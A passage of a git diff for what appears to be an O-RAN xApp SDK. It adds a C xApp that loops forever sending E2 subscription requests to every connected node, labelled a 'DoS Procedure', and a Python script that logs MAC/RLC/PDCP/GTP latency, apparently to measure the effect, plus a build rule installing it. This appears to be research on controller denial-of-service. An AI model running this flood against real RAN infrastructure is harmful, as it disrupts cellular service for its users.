+  e2_node_arr_t nodes = e2_nodes_xapp_api();
+  assert(nodes.len > 0);
+
+  printf("[KPM RC]: Connected E2 nodes = %d\n", nodes.len);
+
+  sm_ans_xapp_t *h = calloc(nodes.len, sizeof(sm_ans_xapp_t));
+  assert(h != NULL && "Memory exhausted");
+
+  pthread_mutexattr_t attr = {0};
+  int rc = pthread_mutex_init(&mtx, &attr);
+  assert(rc == 0);
+
+  printf("--------------Starting DoS Procedure...------------------------\n");
+  while (1) {
+    // e2_node_arr_t nodes = e2_nodes_xapp_api();
+    ////////////
+    // START KPM
+    ////////////
+    kpm_sub_data_t kpm_sub = {0};
+
+    // KPM Event Trigger
+    uint64_t period_ms = 100;
+    kpm_sub.ev_trg_def = gen_ev_trig(period_ms);
+
+    const int KPM_ran_function = 2;
+
+    for (size_t i = 0; i < nodes.len; ++i) {
+      // KPM Action Definition
+      kpm_sub.sz_ad = 1;
+      kpm_sub.ad = calloc(1, sizeof(kpm_act_def_t));
+      assert(kpm_sub.ad != NULL && "Memory exhausted");
+
+      ngran_node_t const t = nodes.n[i].id.type;
+      bool du_or_gnb = t == ngran_gNB || t == ngran_gNB_DU;
+      const char *act = du_or_gnb ? "DRB.RlcSduDelayDl" : "DRB.PdcpSduVolumeDL";
+      *kpm_sub.ad = gen_act_def(act);
+
+      printf("Sending Subscription Request...\n");
+      h[i] = report_sm_xapp_api(&nodes.n[i].id, KPM_ran_function, &kpm_sub,
+                                sm_cb_kpm);
+      assert(h[i].success == true);
+
+      free_kpm_sub_data(&kpm_sub);
+    }
+  }
+
+  ////////////
+  // START KPM
+  ////////////
+  kpm_sub_data_t kpm_sub = {0};
+
+  // KPM Event Trigger
+  uint64_t period_ms = 100;
+  kpm_sub.ev_trg_def = gen_ev_trig(period_ms);
+
+  const int KPM_ran_function = 2;
+
+  for (size_t i = 0; i < nodes.len; ++i) {
+    // KPM Action Definition
+    kpm_sub.sz_ad = 1;
+    kpm_sub.ad = calloc(1, sizeof(kpm_act_def_t));
+    assert(kpm_sub.ad != NULL && "Memory exhausted");
+
+    ngran_node_t const t = nodes.n[i].id.type;
+    bool du_or_gnb = t == ngran_gNB || t == ngran_gNB_DU;
+    const char *act = du_or_gnb ? "DRB.RlcSduDelayDl" : "DRB.PdcpSduVolumeDL";
+    *kpm_sub.ad = gen_act_def(act);
+
+    h[i] = report_sm_xapp_api(&nodes.n[i].id, KPM_ran_function, &kpm_sub,
+                              sm_cb_kpm);
+    assert(h[i].success == true);
+
+    free_kpm_sub_data(&kpm_sub);
+  }
+
+  ////////////
+  // END KPM
+  ////////////
+
+  sleep(5);
+
+  ////////////
+  // START RC
+  ////////////
+
+  // RC On Demand report
+  //  rc_sub_data_t rc_sub = {0};
+  //  defer({ free_rc_sub_data(&rc_sub); });
+  //  sm_ans_xapp_t h_2 = report_sm_xapp_api(&nodes.n[0].id, RC_ran_function,
+  //  &rc_sub, sm_cb_rc); assert(h_2.success == true);
+
+  // RC Control
+  rc_ctrl_req_data_t rc_ctrl = {0};
+
+  rc_ctrl.hdr = gen_rc_ctrl_hdr();
+  rc_ctrl.msg = gen_rc_ctrl_msg();
+
+  const int RC_ran_function = 3;
+
+  for (size_t i = 0; i < nodes.len; ++i) {
+    ngran_node_t const t = nodes.n[i].id.type;
+    if (t == ngran_gNB || t == ngran_gNB_CU)
+      control_sm_xapp_api(&nodes.n[i].id, RC_ran_function, &rc_ctrl);
+  }
+  free_rc_ctrl_req_data(&rc_ctrl);
+
+  ////////////
+  // END RC
+  ////////////
+
+  sleep(5);
+
+  for (int i = 0; i < nodes.len; ++i) {
+    // Remove the handle previously returned
+    rm_report_sm_xapp_api(h[i].u.handle);
+  }
+
+  sleep(1);
+  // Stop the xApp
+  while (try_stop_xapp_api() == false)
+    usleep(1000);
+
+  free(h);
+
+  free_e2_node_arr(&nodes);
+
+  rc = pthread_mutex_destroy(&mtx);
+  assert(rc == 0);
+
+  printf("[KPM RC]: DoS ended SUCCESSFULLY\n");
+}
diff --git a/examples/xApp/python3/xapp_moni_dos.py b/examples/xApp/python3/xapp_moni_dos.py
new file mode 100644
index 00000000..69d6efdd
--- /dev/null
+++ b/examples/xApp/python3/xapp_moni_dos.py
@@ -0,0 +1,204 @@
+import xapp_sdk as ric
+import time
+import sys
+import os
+import pdb
+
+####################
+#### MAC INDICATION CALLBACK
+####################
+
+#  MACCallback class is defined and derived from C++ class mac_cb
+class MACCallback(ric.mac_cb):
+    # Define Python class 'constructor'
+    def __init__(self):
+        # Call C++ base class constructor
+        ric.mac_cb.__init__(self)
+    # Override C++ method: virtual void handle(swig_mac_ind_msg_t a) = 0;
+    def handle(self, ind):
+        # Print swig_mac_ind_msg_t
+        if len(ind.ue_stats) > 0:
+            f = open(f"{folder_path}/mac.txt", 'a')
+            t_now = time.time_ns() / 1000.0
+            t_mac = ind.tstamp / 1.0
+            t_diff = t_now - t_mac
+            print('MAC Indication tstamp = ' + str(t_mac) + ' latency = ' + str(t_diff) + ' Î¼s')
+            # print('MAC rnti = ' + str(ind.ue_stats[0].rnti))
+            f.write(f"Time: {str(ind.tstamp)}, latency = {str(t_diff)}\n")
+            f.close()
+
+####################
+#### RLC INDICATION CALLBACK
+####################
+
+class RLCCallback(ric.rlc_cb):
+    # Define Python class 'constructor'
+    def __init__(self):
+        # Call C++ base class constructor
+        ric.rlc_cb.__init__(self)
+    # Override C++ method: virtual void handle(swig_rlc_ind_msg_t a) = 0;
+    def handle(self, ind):
+        # Print swig_rlc_ind_msg_t
+        if len(ind.rb_stats) > 0:
+            f = open(f"{folder_path}/rlc.txt", 'a')
+            t_now = time.time_ns() / 1000.0
+            t_rlc = ind.tstamp / 1.0
+            t_diff = t_now - t_rlc
+            print('RLC Indication tstamp = ' + str(ind.tstamp) + ' latency = ' + str(t_diff) + ' Î¼s')
+            f.write(f"Time: {str(ind.tstamp)}, latency = {str(t_diff)}\n")
+            f.close()
+            # print('RLC rnti = '+ str(ind.rb_stats[0].rnti))
+
+####################
+#### PDCP INDICATION CALLBACK
+####################
+
+
+class PDCPCallback(ric.pdcp_cb):
+    # Define Python class 'constructor'
+    def __init__(self):
+        # Call C++ base class constructor
+        ric.pdcp_cb.__init__(self)
+   # Override C++ method: virtual void handle(swig_pdcp_ind_msg_t a) = 0;
+    def handle(self, ind):
+        # Print swig_pdcp_ind_msg_t
+        if len(ind.rb_stats) > 0:
+            f = open(f"{folder_path}/pdcp.txt", 'a')
+            t_now = time.time_ns() / 1000.0
+            t_pdcp = ind.tstamp / 1.0
+            t_diff = t_now - t_pdcp
+            print('PDCP Indication tstamp = ' + str(ind.tstamp) + ' latency = ' + str(t_diff) + ' Î¼s')
+            f.write(f"Time: {str(ind.tstamp)}, latency = {str(t_diff)}\n")
+            f.close()
+
+            # print('PDCP rnti = '+ str(ind.rb_stats[0].rnti))
+
+####################
+#### GTP INDICATION CALLBACK
+####################
+
+# Create a callback for GTP which derived it from C++ class gtp_cb
+class GTPCallback(ric.gtp_cb):
+    def __init__(self):
+        # Inherit C++ gtp_cb class
+        ric.gtp_cb.__init__(self)
+    # Create an override C++ method 
+    def handle(self, ind):
+        if len(ind.gtp_stats) > 0:
+            f = open(f"{folder_path}/gtp.txt", 'a')
+            t_now = time.time_ns() / 1000.0
+            t_gtp = ind.tstamp / 1.0
+            t_diff = t_now - t_gtp
+            print('GTP Indication tstamp = ' + str(ind.tstamp) + ' diff = ' + str(t_diff) + ' Î¼s')
+            f.write(f"Time: {str(ind.tstamp)}, diff = {str(t_diff)}\n")
+            f.close()
+
+
+####################
+####  GENERAL 
+####################
+
+if len(sys.argv) < 2:
+        print("Usage: python3 xapp_moni_dos.py folder_path")
+        sys.exit(1)
+
+folder_path = sys.argv[1]
+
+
+if not os.path.isdir(folder_path):
+    print("Error: Invalid folder path.")
+    sys.exit(1)
+
+f = open(f"{folder_path}/mac.txt", 'w')
+f.write(f"Init time: {time.time_ns() / 1000.0}\n")
+f.close()
+
+f = open(f"{folder_path}/rlc.txt", 'w')
+f.write(f"Init time: {time.time_ns() / 1000.0}\n")
+f.close()
+
+f = open(f"{folder_path}/pdcp.txt", 'w')
+f.write(f"Init time: {time.time_ns() / 1000.0}\n")
+f.close()
+
+f = open(f"{folder_path}/gtp.txt", 'w')
+f.write(f"Init time: {time.time_ns() / 1000.0}\n")
+f.close()
+
+
+ric.init()
+
+conn = ric.conn_e2_nodes()
+assert(len(conn) > 0)
+for i in range(0, len(conn)):
+    print("Global E2 Node [" + str(i) + "]: PLMN MCC = " + str(conn[i].id.plmn.mcc))
+    print("Global E2 Node [" + str(i) + "]: PLMN MNC = " + str(conn[i].id.plmn.mnc))
+
+####################
+#### MAC INDICATION
+####################
+
+mac_hndlr = []
+for i in range(0, len(conn)):
+    mac_cb = MACCallback()
+    hndlr = ric.report_mac_sm(conn[i].id, ric.Interval_ms_1, mac_cb)
+    mac_hndlr.append(hndlr)     
+    time.sleep(1)
+
+####################
+#### RLC INDICATION
+####################
+
+rlc_hndlr = []
+for i in range(0, len(conn)):
+    rlc_cb = RLCCallback()
+    hndlr = ric.report_rlc_sm(conn[i].id, ric.Interval_ms_1, rlc_cb)
+    rlc_hndlr.append(hndlr) 
+    time.sleep(1)
+
+####################
+#### PDCP INDICATION
+####################
+
+pdcp_hndlr = []
+for i in range(0, len(conn)):
+    pdcp_cb = PDCPCallback()
+    hndlr = ric.report_pdcp_sm(conn[i].id, ric.Interval_ms_1, pdcp_cb)
+    pdcp_hndlr.append(hndlr) 
+    time.sleep(1)
+
+####################
+#### GTP INDICATION
+####################
+
+gtp_hndlr = []
+for i in range(0, len(conn)):
+    gtp_cb = GTPCallback()
+    hndlr = ric.report_gtp_sm(conn[i].id, ric.Interval_ms_1, gtp_cb)
+    gtp_hndlr.append(hndlr)
+    time.sleep(1)
+
+time.sleep(120)
+
+### End
+
+for i in range(0, len(mac_hndlr)):
+    ric.rm_report_mac_sm(mac_hndlr[i])
+
+for i in range(0, len(rlc_hndlr)):
+    ric.rm_report_rlc_sm(rlc_hndlr[i])
+
+for i in range(0, len(pdcp_hndlr)):
+    ric.rm_report_pdcp_sm(pdcp_hndlr[i])
+
+for i in range(0, len(gtp_hndlr)):
+    ric.rm_report_gtp_sm(gtp_hndlr[i])
+
+
+
+
+# Avoid deadlock. ToDo revise architecture 
+while ric.try_stop == 0:
+    time.sleep(1)
+
+print("Test finished")
\ No newline at end of file
diff --git a/src/xApp/swig/CMakeLists.txt b/src/xApp/swig/CMakeLists.txt
index fe0a8c54..a1c1a693 100644
--- a/src/xApp/swig/CMakeLists.txt
+++ b/src/xApp/swig/CMakeLists.txt
@@ -87,6 +87,10 @@ if(XAPP_TARGET_LANGUAGE STREQUAL "PYTHON_LANG")
      "${CMAKE_SOURCE_DIR}/examples/xApp/python3/xapp_mac_rlc_pdcp_gtp_moni.py"
      "${CMAKE_BINARY_DIR}/examples/xApp/python3/xapp_mac_rlc_pdcp_gtp_moni.py" )
 
+   add_custom_command(TARGET xapp_sdk POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different
+     "${CMAKE_SOURCE_DIR}/examples/xApp/python3/xapp_moni_dos.py"
+     "${CMAKE_BINARY_DIR}/examples/xApp/python3/xapp_moni_dos.py" )
+
    add_custom_command(TARGET xapp_sdk POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different
      "${CMAKE_SOURCE_DIR}/examples/xApp/python3/xapp_slice_moni_ctrl.py" "${CMAKE_BINARY_DIR}/examples/xApp/python3/xapp_slice_moni_ctrl.py" )
 
